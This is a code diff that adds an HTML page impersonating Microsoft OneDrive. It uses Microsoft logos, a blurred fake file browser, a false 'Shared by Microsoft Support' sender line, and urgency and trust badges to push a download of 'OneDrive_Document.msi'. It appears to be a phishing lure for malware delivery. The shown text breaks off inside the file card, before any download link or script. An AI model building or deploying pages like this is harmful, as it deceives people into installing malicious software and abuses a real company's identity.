@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OneDrive - Secure File</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 28 18'%3E%3Cpath d='M7.5 14C4.46 14 2 11.54 2 8.5C2 5.73 4.04 3.43 6.72 3.04C7.37 1.25 9.07 0 11 0C13.4 0 15.37 1.77 15.72 4.08C16.14 4.03 16.57 4 17 4C20.87 4 24 7.13 24 11C24 11.69 23.9 12.35 23.72 13H7.5V14Z' fill='%230078d4'/%3E%3Cpath d='M17.2 7.5C15.18 7.5 13.45 8.62 12.54 10.27C12.05 10.1 11.53 10 11 10C8.24 10 6 12.24 6 15C6 17.76 8.24 20 11 20H26C27.1 20 28 19.1 28 18V17.5C28 12.25 23.64 7.5 17.2 7.5Z' fill='%230078d4'/%3E%3C/svg%3E">
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  overflow-x: hidden;
+  background: #f3f2f1;
+}
+
+/* ── BACKGROUND ── */
+.ai-bg {
+  position: fixed;
+  inset: 0;
+  z-index: 0;
+  background: linear-gradient(135deg, #e3f0fc 0%, #f3f2f1 35%, #daeeff 65%, #eaf4ff 100%);
+  overflow: hidden;
+}
+.ai-bg canvas { position:absolute; inset:0; width:100%; height:100%; }
+
+/* ── FAKE ONEDRIVE FILE BROWSER (background) ── */
+.od-browser {
+  position: fixed;
+  inset: 96px 0 0 0;
+  z-index: 1;
+  display: grid;
+  grid-template-columns: 220px 1fr;
+  pointer-events: none;
+  filter: blur(2.5px);
+  opacity: 0.55;
+}
+
+/* Left sidebar */
+.od-sidebar {
+  background: rgba(255,255,255,0.7);
+  border-right: 1px solid #edebe9;
+  padding: 16px 0;
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.od-nav-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 7px 16px;
+  font-size: 13px;
+  color: #323130;
+  border-radius: 4px;
+  margin: 0 4px;
+}
+.od-nav-item.active { background: rgba(0,120,212,0.12); color: #0078d4; font-weight: 600; }
+.od-nav-icon { width: 16px; height: 16px; flex-shrink: 0; }
+.od-storage {
+  margin-top: auto;
+  padding: 12px 16px;
+  font-size: 11px;
+  color: #605e5c;
+}
+.od-storage-bar { height: 4px; background: #edebe9; border-radius: 2px; margin: 6px 0 4px; }
+.od-storage-fill { height: 100%; width: 38%; background: #0078d4; border-radius: 2px; }
+
+/* Main content */
+.od-main {
+  background: rgba(255,255,255,0.5);
+  padding: 0;
+  display: flex;
+  flex-direction: column;
+}
+.od-toolbar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 20px;
+  border-bottom: 1px solid #edebe9;
+  background: rgba(255,255,255,0.6);
+}
+.od-tb-btn {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  padding: 5px 10px;
+  border: 1px solid #edebe9;
+  border-radius: 3px;
+  font-size: 12px;
+  color: #323130;
+  background: #fff;
+}
+.od-tb-sep { width: 1px; height: 20px; background: #edebe9; margin: 0 4px; }
+.od-col-header {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1fr 1fr;
+  padding: 6px 20px;
+  font-size: 11px;
+  color: #605e5c;
+  border-bottom: 1px solid #edebe9;
+  background: rgba(248,248,248,0.8);
+}
+.od-files { display: flex; flex-direction: column; }
+.od-file-row {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1fr 1fr;
+  align-items: center;
+  padding: 7px 20px;
+  border-bottom: 1px solid rgba(237,235,233,0.6);
+  font-size: 12px;
+  color: #323130;
+  background: rgba(255,255,255,0.3);
+}
+.od-file-row:nth-child(even) { background: rgba(250,250,250,0.4); }
+.od-file-name { display: flex; align-items: center; gap: 8px; }
+.od-file-ico { width: 20px; height: 20px; border-radius: 3px; display: flex; align-items: center; justify-content: center; font-size: 7px; font-weight: 800; color: #fff; flex-shrink: 0; }
+.ico-folder { background: #ffb900; }
+.ico-word   { background: #2b579a; }
+.ico-excel  { background: #217346; }
+.ico-pdf    { background: #e8472a; }
+.ico-ppt    { background: #d24726; }
+.ico-img    { background: #6264a7; }
+.ico-zip    { background: #8a8886; }
+.od-file-mod  { color: #605e5c; font-size: 11px; }
+.od-file-size { color: #605e5c; font-size: 11px; }
+.od-file-share { font-size: 11px; color: #0078d4; }
+
+/* Dark vignette behind card */
+.vignette {
+  position: fixed;
+  inset: 0;
+  z-index: 5;
+  background: radial-gradient(ellipse at center, rgba(0,0,0,0.18) 0%, rgba(0,0,0,0.38) 100%);
+  pointer-events: none;
+}
+
+/* ── TOP NAV ── */
+.topbar {
+  position: relative;
+  z-index: 100;
+  background: #0078d4;
+  height: 48px;
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  box-shadow: 0 1px 4px rgba(0,0,0,0.25);
+}
+.topbar-left  { display:flex; align-items:center; gap:8px; flex:1; }
+.topbar-title { color:#fff; font-size:15px; font-weight:600; letter-spacing:0.01em; }
+.topbar-search {
+  flex:1; max-width:360px; margin:0 auto;
+  background:rgba(255,255,255,0.18); border:1px solid rgba(255,255,255,0.3);
+  border-radius:3px; height:32px; display:flex; align-items:center;
+  padding:0 10px; gap:8px; color:rgba(255,255,255,0.8); font-size:13px;
+}
+.topbar-right { display:flex; align-items:center; gap:12px; flex:1; justify-content:flex-end; }
+.topbar-icon  { width:32px; height:32px; border-radius:50%; background:rgba(255,255,255,0.15); display:flex; align-items:center; justify-content:center; }
+.avatar       { width:32px; height:32px; border-radius:50%; background:#fff; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; color:#0078d4; }
+
+/* ── BREADCRUMB ── */
+.breadcrumb {
+  position:relative; z-index:10; padding:7px 24px; font-size:12px; color:#605e5c;
+  display:flex; align-items:center; gap:6px;
+  background:rgba(255,255,255,0.75); border-bottom:1px solid #edebe9;
+  backdrop-filter:blur(8px);
+}
+.breadcrumb a { color:#0078d4; text-decoration:none; }
+.breadcrumb a:hover { text-decoration:underline; }
+.breadcrumb-sep { color:#bbb; }
+
+/* ── OVERLAY ── */
+.overlay {
+  position:relative; z-index:10; flex:1;
+  display:flex; align-items:center; justify-content:center;
+  padding:32px 16px 40px;
+}
+
+/* ── CARD ── */
+.card {
+  width:100%; max-width:460px;
+  background:rgba(255,255,255,0.88);
+  backdrop-filter:blur(24px); -webkit-backdrop-filter:blur(24px);
+  border:1px solid rgba(255,255,255,0.95);
+  border-radius:3px;
+  box-shadow: 0 16px 48px rgba(0,0,0,0.28), 0 4px 16px rgba(0,120,212,0.18), inset 0 1px 0 rgba(255,255,255,0.9);
+  overflow:hidden;
+  opacity:0; transform:translateY(28px);
+  animation:cardIn 0.6s cubic-bezier(0.22,1,0.36,1) 0.2s forwards;
+}
+@keyframes cardIn { to { opacity:1; transform:translateY(0); } }
+
+/* Left accent strip */
+.card::before {
+  content:'';
+  position:absolute;
+  left:0; top:0; bottom:0;
+  width:3px;
+  background:linear-gradient(180deg, #0078d4 0%, #00bcf2 100%);
+}
+
+/* ── SKELETON ── */
+.skeleton { position:relative; overflow:hidden; background:#ebebeb; border-radius:3px; }
+.skeleton::after {
+  content:''; position:absolute; inset:0;
+  background:linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.75) 50%, transparent 100%);
+  animation:shimmer 1.4s infinite;
+}
+@keyframes shimmer { from{transform:translateX(-100%)} to{transform:translateX(100%)} }
+.card-skeleton { padding:28px 32px; display:flex; flex-direction:column; gap:16px; }
+.sk-header { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
+.sk-logo   { width:22px; height:22px; border-radius:3px; }
+.sk-title  { height:14px; width:80px; border-radius:3px; }
+.sk-h1     { height:18px; width:55%; border-radius:3px; margin:0 auto; }
+.sk-file   { height:66px; border-radius:4px; }
+.sk-line1  { height:11px; width:90%; border-radius:3px; }
+.sk-line2  { height:11px; width:65%; border-radius:3px; }
+.sk-btn    { height:38px; border-radius:3px; }
+.card-content { display:none; }
+.card-content.visible { display:block; }
+
+/* ── CARD INNER ── */
+.card-header {
+  text-align:center; padding:22px 32px 16px;
+  border-bottom:1px solid rgba(237,235,233,0.9);
+}
+.ms-logo { display:flex; align-items:center; justify-content:center; gap:8px; }
+.ms-logo span { font-size:17px; color:#201f1e; font-weight:400; }
+.card-body { padding:20px 32px 24px; }
+.card-title { font-size:17px; font-weight:600; color:#201f1e; text-align:center; margin-bottom:16px; }
+
+/* Shared by */
+.shared-by {
+  display:flex; align-items:center; gap:8px; font-size:12px; color:#605e5c;
+  margin-bottom:12px; padding:8px 10px;
+  background:rgba(0,120,212,0.06); border-radius:3px; border-left:3px solid #0078d4;
+}
+.shared-by strong { color:#201f1e; }
+
+/* Expiry */
+.expiry-banner {
+  display:flex; align-items:center; gap:8px; font-size:12px; color:#7a5c00; font-weight:500;
+  background:linear-gradient(135deg,#fff8e1,#fff3cd); border:1px solid #ffc107;
+  border-radius:3px; padding:7px 10px; margin-bottom:12px;
+}
+
+/* File row */
+.file-row {
+  display:flex; align-items:center; gap:14px;
+  background:rgba(243,242,241,0.7); border-radius:3px;
+  padding:13px 14px; margin-bottom:8px;
+  border:1px solid rgba(0,120,212,0.1);
+  transition:background 0.18s, box-shadow 0.18s;
+  cursor:default; position:relative;
+}
+.file-row:hover {
+  background:rgba(0,120,212,0.06);
+  box-shadow:0 0 0 1px rgba(0,120,212,0.2);
+}
+.file-icon-wrap { position:relative; flex-shrink:0; }
+
+/* MSI icon */
+.msi-icon {
+  width:44px; height:44px; border-radius:4px;
+  background:linear-gradient(145deg,#0078d4 0%,#004f91 100%);
+  display:flex; flex-direction:column; align-items:center; justify-content:center;
+  position:relative; overflow:hidden;
+  box-shadow:0 3px 10px rgba(0,120,212,0.4);
+}
+.msi-icon::before {
+  content:''; position:absolute; top:0; left:0; right:0; height:50%;
+  background:rgba(255,255,255,0.1);
+}
+.msi-icon::after {
+  content:''; position:absolute;
+  top:-50%; left:-60%; width:35%; height:200%;
+  background:rgba(255,255,255,0.3); transform:skewX(-20deg);
+  animation:iconShimmer 2.8s ease-in-out infinite;
+}
+@keyframes iconShimmer {
+  0%   { left:-60%; opacity:0; }
+  20%  { opacity:1; }
+  80%  { opacity:1; }
+  100% { left:130%; opacity:0; }
+}
+.msi-icon svg { position:relative; z-index:1; }
+.msi-label { font-size:7.5px; font-weight:800; color:#fff; letter-spacing:0.08em; position:relative; z-index:1; margin-top:2px; }
+
+/* Pulse ring */
+.pulse-ring {
+  position:absolute; inset:-7px; border-radius:8px;
+  border:2px solid rgba(0,120,212,0.5);
+  animation:pulseRing 2.2s ease-out infinite;
+}
+@keyframes pulseRing {
+  0%   { transform:scale(0.88); opacity:0.9; }
+  70%  { transform:scale(1.18); opacity:0; }
+  100% { transform:scale(1.18); opacity:0; }
+}
+
+.file-info { flex:1; min-width:0; }
+.file-name { font-size:13px; font-weight:600; color:#201f1e; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.file-meta { font-size:11px; color:#605e5c; margin-top:3px; }
+
+/* Cloud sync */
+.cloud-sync {
+  display:flex; align-items:center; gap:4px;
+  font-size:10px; color:#0078d4; font-weight:500; flex-shrink:0;
+}
+.cloud-sync svg { animation:cloudPulse 2s ease-in-out infinite; }
+@keyframes cloudPulse {
+  0%,100% { opacity:1; transform:scale(1); }
+  50%      { opacity:0.45; transform:scale(0.88); }
+}
+
+/* Verified badge */
+.verified-badge {
+  display:inline-flex; align-items:center; gap:5px;
+  background:linear-gradient(135deg,#e6f4ea,#d4edda);
+  border:1px solid #a8d5b5; border-radius:20px;
+  padding:4px 10px; font-size:11px; font-weight:600; color:#1a7a35;
+  margin:6px 0 12px;
+}
+
+/* Fake preview */
+.preview-wrap {
+  position:relative; background:#f0f0f0; border-radius:4px;
+  height:78px; overflow:hidden; margin-bottom:12px;
+  border:1px solid #e0e0e0;
+  display:flex; align-items:center; justify-content:center;
+}
+.preview-lines { width:72%; display:flex; flex-direction:column; gap:8px; }
+.preview-line  { height:8px; background:#d5d5d5; border-radius:3px; }
+.preview-line.short { width:58%; }
+.preview-line.med   { width:80%; }
+.preview-blur {
+  position:absolute; inset:0;
+  backdrop-filter:blur(5px); -webkit-backdrop-filter:blur(5px);
+  background:rgba(255,255,255,0.55);
+  display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px;
+}
+.preview-blur span { font-size:11px; color:#605e5c; font-weight:500; }
+
+/* Visitor count */
+.visitor-count { font-size:12px; color:#605e5c; text-align:center; margin-bottom:12px; }
+.visitor-count strong { color:#0078d4; }
+
+.desc { font-size:13px; color:#605e5c; line-height:1.6; margin-bottom:16px; }
+
+/* Progress */
+.progress-wrap  { margin-bottom:12px; display:none; }
+.progress-label { font-size:12px; color:#605e5c; margin-bottom:5px; display:flex; justify-content:space-between; }
+.progress-track { height:3px; background:#edebe9; border-radius:2px; overflow:hidden; }
+.progress-fill  { height:100%; width:0%; background:linear-gradient(90deg,#0078d4,#00bcf2); border-radius:2px; transition:width 0.08s linear; }
+
+/* Button */
+.btn-download {
+  display:flex; align-items:center; justify-content:center; gap:8px;
+  width:100%; padding:10px;
+  background:linear-gradient(135deg,#0078d4 0%,#005a9e 100%);
+  color:#fff; border:none; border-radius:2px;
+  font-size:14px; font-weight:600; cursor:pointer; text-decoration:none;
+  transition:all 0.2s;
+  box-shadow:0 2px 10px rgba(0,120,212,0.35);
+  letter-spacing:0.01em;
+}
+.btn-download:hover { background:linear-gradient(135deg,#106ebe 0%,#004b87 100%); box-shadow:0 4px 16px rgba(0,120,212,0.45); transform:translateY(-1px); }
+.btn-download:active { transform:translateY(0); }
+.btn-spinner {
+  width:15px; height:15px; border:2px solid rgba(255,255,255,0.4);
+  border-top-color:#fff; border-radius:50%;
+  animation:spin 0.7s linear infinite; display:none;
+}
+@keyframes spin { to { transform:rotate(360deg); } }
+
+.status-msg { font-size:12px; color:#107c10; text-align:center; margin-top:9px; min-height:17px; font-weight:500; }
+
+/* Metadata */
+.meta-panel {
+  margin-top:14px; border-top:1px solid rgba(237,235,233,0.9);
+  padding-top:12px; display:grid; grid-template-columns:1fr 1fr; gap:8px 16px;
+}
+.meta-item { display:flex; flex-direction:column; gap:2px; }
+.meta-key { font-size:10px; color:#a19f9d; text-transform:uppercase; letter-spacing:0.07em; }
+.meta-val { font-size:12px; color:#201f1e; font-weight:500; }
+
+/* Secured */
+.secured-badge {
+  display:flex; align-items:center; justify-content:center; gap:6px;
+  margin-top:13px; font-size:11px; color:#605e5c;
+}
+
+/* Footer */
+.footer {
+  position:relative; z-index:10; text-align:center;
+  padding:10px 0 18px; font-size:11px; color:#605e5c;
+}
+.footer a { color:#0078d4; text-decoration:none; }
+.footer a:hover { text-decoration:underline; }
+
+/* ── GLASS GLOW COUNT ── */
+.download-count-wrap { display:flex; justify-content:center; margin-bottom:12px; }
+.glass-count-box {
+  display:flex; flex-direction:column; align-items:center; gap:3px;
+  background:linear-gradient(135deg, rgba(0,120,212,0.08) 0%, rgba(0,188,242,0.06) 100%);
+  border:1px solid rgba(0,188,242,0.3);
+  border-radius:10px; padding:10px 24px;
+  position:relative; overflow:hidden;
+  box-shadow:0 0 18px rgba(0,150,255,0.15), inset 0 1px 0 rgba(255,255,255,0.5);
+}
+.glass-count-box::before {
+  content:''; position:absolute; inset:0;
+  background:linear-gradient(135deg, rgba(255,255,255,0.18) 0%, transparent 60%);
+  pointer-events:none;
+}
+.glow-number {
+  font-size:32px; font-weight:900; letter-spacing:0.02em; line-height:1;
+  background:linear-gradient(135deg, #ffffff 0%, #00c6ff 30%, #0078d4 60%, #00eaff 85%, #ffffff 100%);
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+  filter:drop-shadow(0 0 10px rgba(0,180,255,0.9)) drop-shadow(0 0 24px rgba(0,120,212,0.6));
+  animation:glowPulse 2.5s ease-in-out infinite;
+}
+@keyframes glowPulse {
+  0%,100% { filter:drop-shadow(0 0 8px rgba(0,180,255,0.8)) drop-shadow(0 0 20px rgba(0,120,212,0.5)); }
+  50%      { filter:drop-shadow(0 0 16px rgba(0,230,255,1))  drop-shadow(0 0 36px rgba(0,160,255,0.9)); }
+}
+.glow-sub {
+  font-size:10px; font-weight:700; letter-spacing:0.14em; text-transform:uppercase;
+  background:linear-gradient(90deg, #0078d4, #00bcf2, #0078d4);
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+  filter:drop-shadow(0 0 6px rgba(0,150,255,0.6));
+}
+
+/* ── UPDATE LABEL ── */
+.update-label { display:flex; justify-content:center; margin-bottom:10px; }
+.glow-update-tag {
+  font-size:11px; font-weight:700; letter-spacing:0.08em;
+  background:linear-gradient(135deg, #ffffff 0%, #00d4ff 40%, #0078d4 70%, #00eaff 100%);
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+  filter:drop-shadow(0 0 6px rgba(0,180,255,0.7)) drop-shadow(0 0 14px rgba(0,120,212,0.4));
+  animation:glowPulse 3s ease-in-out infinite;
+  text-transform:uppercase;
+}
+
+/* ── FEATURE BADGES ── */
+.new-features { display:flex; flex-direction:column; gap:8px; margin-bottom:14px; }
+.feat-badge {
+  display:flex; align-items:flex-start; gap:10px;
+  background:linear-gradient(135deg, rgba(255,255,255,0.55) 0%, rgba(0,120,212,0.06) 100%);
+  border:1px solid rgba(0,188,242,0.25);
+  border-radius:4px; padding:10px 12px;
+  position:relative; overflow:hidden;
+  box-shadow:0 0 12px rgba(0,120,212,0.08), inset 0 1px 0 rgba(255,255,255,0.6);
+  backdrop-filter:blur(4px);
+}
+.feat-badge::after {
+  content:''; position:absolute; inset:0;
+  background:linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.28) 50%, transparent 100%);
+  transform:translateX(-100%);
+  animation:featShimmer 3.5s ease-in-out infinite;
+}
+@keyframes featShimmer {
+  0%   { transform:translateX(-100%); opacity:0; }
+  25%  { opacity:1; }
+  75%  { opacity:1; }
+  100% { transform:translateX(110%); opacity:0; }
+}
+.feat-icon {
+  font-size:17px; flex-shrink:0; margin-top:1px;
+  background:linear-gradient(135deg, #00bcf2, #0078d4);
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+  filter:drop-shadow(0 0 6px rgba(0,188,242,0.9));
+  animation:iconGlow 2s ease-in-out infinite alternate;
+}
+@keyframes iconGlow {
+  from { filter:drop-shadow(0 0 4px rgba(0,188,242,0.6)); }
+  to   { filter:drop-shadow(0 0 12px rgba(0,230,255,1)) drop-shadow(0 0 22px rgba(0,120,212,0.6)); }
+}
+.feat-text { display:flex; flex-direction:column; gap:3px; }
+.feat-title { font-size:12px; font-weight:700; }
+.glow-text-sm {
+  background:linear-gradient(135deg, #005a9e 0%, #0078d4 40%, #00bcf2 70%, #ffffff 100%);
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;
+  filter:drop-shadow(0 0 5px rgba(0,150,255,0.55));
+}
+.feat-desc { font-size:11px; color:#605e5c; line-height:1.5; }
+
+/* Mobile */
+@media(max-width:500px){
+  .topbar-search { display:none; }
+  .card-body { padding:16px 18px 20px; }
+  .card-header { padding:18px 18px 14px; }
+  .meta-panel { grid-template-columns:1fr; }
+  .od-browser { display:none; }
+}
+</style>
+</head>
+<body>
+
+<!-- AI animated background -->
+<div class="ai-bg"><canvas id="aiCanvas"></canvas></div>
+
+<!-- OneDrive file browser (blurred background) -->
+<div class="od-browser">
+  <!-- Sidebar -->
+  <div class="od-sidebar">
+    <div class="od-nav-item active">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><path d="M1 9l7-7 7 7v6a1 1 0 01-1 1H2a1 1 0 01-1-1V9z" stroke="#0078d4" stroke-width="1.3"/></svg>
+      Home
+    </div>
+    <div class="od-nav-item">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><path d="M2 4h5l2 2h5v8H2z" stroke="#323130" stroke-width="1.3"/></svg>
+      My Files
+    </div>
+    <div class="od-nav-item">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="#323130" stroke-width="1.3"/><path d="M5 8h6M8 5v6" stroke="#323130" stroke-width="1.3"/></svg>
+      Shared
+    </div>
+    <div class="od-nav-item">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6" stroke="#323130" stroke-width="1.3"/><path d="M8 5v3l2 2" stroke="#323130" stroke-width="1.3" stroke-linecap="round"/></svg>
+      Recent
+    </div>
+    <div class="od-nav-item">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><path d="M8 1l1.8 3.6L14 5.5l-3 2.9.7 4.1L8 10.4l-3.7 2.1.7-4.1L2 5.5l4.2-.9z" stroke="#323130" stroke-width="1.3"/></svg>
+      Favorites
+    </div>
+    <div class="od-nav-item">
+      <svg class="od-nav-icon" viewBox="0 0 16 16" fill="none"><polyline points="3,3 3,13 13,13" stroke="#323130" stroke-width="1.3"/><path d="M6 10L9 7l2 2 3-3" stroke="#323130" stroke-width="1.3" stroke-linecap="round"/></svg>
+      Photos
+    </div>
+    <div class="od-storage">
+      <div>6.2 GB of 15 GB used</div>
+      <div class="od-storage-bar"><div class="od-storage-fill"></div></div>
+      <div>Upgrade storage</div>
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <div class="od-main">
+    <div class="od-toolbar">
+      <div class="od-tb-btn">+ New</div>
+      <div class="od-tb-btn">↑ Upload</div>
+      <div class="od-tb-sep"></div>
+      <div class="od-tb-btn">⇅ Sort</div>
+      <div class="od-tb-btn">⊞ View</div>
+    </div>
+    <div class="od-col-header">
+      <span>Name</span><span>Modified</span><span>File size</span><span>Sharing</span>
+    </div>
+    <div class="od-files">
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-folder">📁</div> Q4 Reports</div>
+        <div class="od-file-mod">Jun 24, 2026</div><div class="od-file-size">—</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-word" style="font-size:8px">W</div> Annual_Review_2026.docx</div>
+        <div class="od-file-mod">Jun 22, 2026</div><div class="od-file-size">2.4 MB</div><div class="od-file-share">Private</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-excel" style="font-size:8px">X</div> Budget_2026.xlsx</div>
+        <div class="od-file-mod">Jun 20, 2026</div><div class="od-file-size">1.1 MB</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-pdf" style="font-size:7px">PDF</div> Contract_Final.pdf</div>
+        <div class="od-file-mod">Jun 18, 2026</div><div class="od-file-size">856 KB</div><div class="od-file-share">Private</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-ppt" style="font-size:8px">P</div> Q3_Presentation.pptx</div>
+        <div class="od-file-mod">Jun 15, 2026</div><div class="od-file-size">4.2 MB</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-img" style="font-size:7px">IMG</div> Team_Photo_2026.png</div>
+        <div class="od-file-mod">Jun 12, 2026</div><div class="od-file-size">3.8 MB</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-zip" style="font-size:7px">ZIP</div> Archive_May2026.zip</div>
+        <div class="od-file-mod">Jun 10, 2026</div><div class="od-file-size">12.6 MB</div><div class="od-file-share">Private</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-word" style="font-size:8px">W</div> Meeting_Notes_June.docx</div>
+        <div class="od-file-mod">Jun 8, 2026</div><div class="od-file-size">540 KB</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-excel" style="font-size:8px">X</div> Sales_Tracker_Q2.xlsx</div>
+        <div class="od-file-mod">Jun 5, 2026</div><div class="od-file-size">780 KB</div><div class="od-file-share">Shared</div>
+      </div>
+      <div class="od-file-row">
+        <div class="od-file-name"><div class="od-file-ico ico-pdf" style="font-size:7px">PDF</div> Compliance_Report.pdf</div>
+        <div class="od-file-mod">Jun 2, 2026</div><div class="od-file-size">1.3 MB</div><div class="od-file-share">Private</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Dark vignette -->
+<div class="vignette"></div>
+
+<!-- Top Nav -->
+<div class="topbar">
+  <div class="topbar-left">
+    <svg width="20" height="13" viewBox="0 0 28 18" fill="none">
+      <path d="M7.5 14C4.46 14 2 11.54 2 8.5C2 5.73 4.04 3.43 6.72 3.04C7.37 1.25 9.07 0 11 0C13.4 0 15.37 1.77 15.72 4.08C16.14 4.03 16.57 4 17 4C20.87 4 24 7.13 24 11C24 11.69 23.9 12.35 23.72 13H7.5V14Z" fill="white" opacity="0.9"/>
+      <path d="M17.2 7.5C15.18 7.5 13.45 8.62 12.54 10.27C12.05 10.1 11.53 10 11 10C8.24 10 6 12.24 6 15C6 17.76 8.24 20 11 20H26C27.1 20 28 19.1 28 18V17.5C28 12.25 23.64 7.5 17.2 7.5Z" fill="white"/>
+    </svg>
+    <span class="topbar-title">OneDrive</span>
+  </div>
+  <div class="topbar-search">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+      <circle cx="6.5" cy="6.5" r="5" stroke="rgba(255,255,255,0.8)" stroke-width="1.5"/>
+      <path d="M10.5 10.5L14 14" stroke="rgba(255,255,255,0.8)" stroke-width="1.5" stroke-linecap="round"/>
+    </svg>
+    Search everything
+  </div>
+  <div class="topbar-right">
+    <div class="topbar-icon">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+        <path d="M8 1a5 5 0 015 5c0 3-1.5 5-2 6H5c-.5-1-2-3-2-6a5 5 0 015-5z" stroke="rgba(255,255,255,0.85)" stroke-width="1.3"/>
+        <path d="M6 12a2 2 0 004 0" stroke="rgba(255,255,255,0.85)" stroke-width="1.3"/>
+      </svg>
+    </div>
+    <div class="topbar-icon">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+        <circle cx="8" cy="8" r="6" stroke="rgba(255,255,255,0.85)" stroke-width="1.3"/>
+        <path d="M8 5v3l2 2" stroke="rgba(255,255,255,0.85)" stroke-width="1.3" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="avatar">MS</div>
+  </div>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M1 9l7-7 7 7v6H2V9z" stroke="#0078d4" stroke-width="1.3"/></svg>
+  <a href="#">OneDrive</a>
+  <span class="breadcrumb-sep">›</span>
+  <a href="#">Shared</a>
+  <span class="breadcrumb-sep">›</span>
+  <span>Documents</span>
+</div>
+
+<!-- Main card -->
+<div class="overlay">
+  <div class="card">
+
+    <!-- Skeleton -->
+    <div class="card-skeleton" id="skeleton">
+      <div class="sk-header">
+        <div class="skeleton sk-logo"></div>
+        <div class="skeleton sk-title"></div>
+      </div>
+      <div class="skeleton sk-h1"></div>
+      <div class="skeleton sk-file"></div>
+      <div class="skeleton sk-line1"></div>
+      <div class="skeleton sk-line2"></div>
+      <div class="skeleton sk-btn"></div>
+    </div>
+
+    <!-- Content -->
+    <div class="card-content" id="cardContent">
+      <div class="card-header">
+        <div class="ms-logo">
+          <svg width="22" height="22" viewBox="0 0 23 23">
+            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+          </svg>
+          <span>Microsoft</span>
+        </div>
+      </div>
+
+      <div class="card-body">
+        <div class="card-title">Secure File Download</div>
+
+        <div class="shared-by">
+          <svg width="13" height="13" viewBox="0 0 16 16" fill="none">
+            <circle cx="8" cy="5" r="3" stroke="#0078d4" stroke-width="1.3"/>
+            <path d="M2 13c0-2.76 2.69-5 6-5s6 2.24 6 5" stroke="#0078d4" stroke-width="1.3" stroke-linecap="round"/>
+          </svg>
+          Shared by: <strong>Microsoft Support</strong>&nbsp;· support@microsoft.com
+        </div>
+
+
+        <div class="file-row" id="fileRow">
+          <div class="file-icon-wrap">
+            <div class="msi-icon">
+              <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                <rect x="2" y="2" width="6" height="6" rx="1" fill="white" opacity="0.92"/>
+                <rect x="10" y="2" width="6" height="6" rx="1" fill="white" opacity="0.7"/>
+                <rect x="2" y="10" width="6" height="6" rx="1" fill="white" opacity="0.7"/>
+                <rect x="10" y="10" width="6" height="6" rx="1" fill="white" opacity="0.92"/>
+              </svg>
+              <span class="msi-label">MSI</span>
+            </div>
+            <div class="pulse-ring"></div>
+          </div>
+          <div class="file-info">
+            <div class="file-name">OneDrive_Document.msi</div>
+            <div class="file-meta">56.1 KB &nbsp;·&nbsp; Microsoft Installer Package</div>
+          </div>
+          <div class="cloud-sync">
+            <svg width="14" height="10" viewBox="0 0 28 18" fill="none">
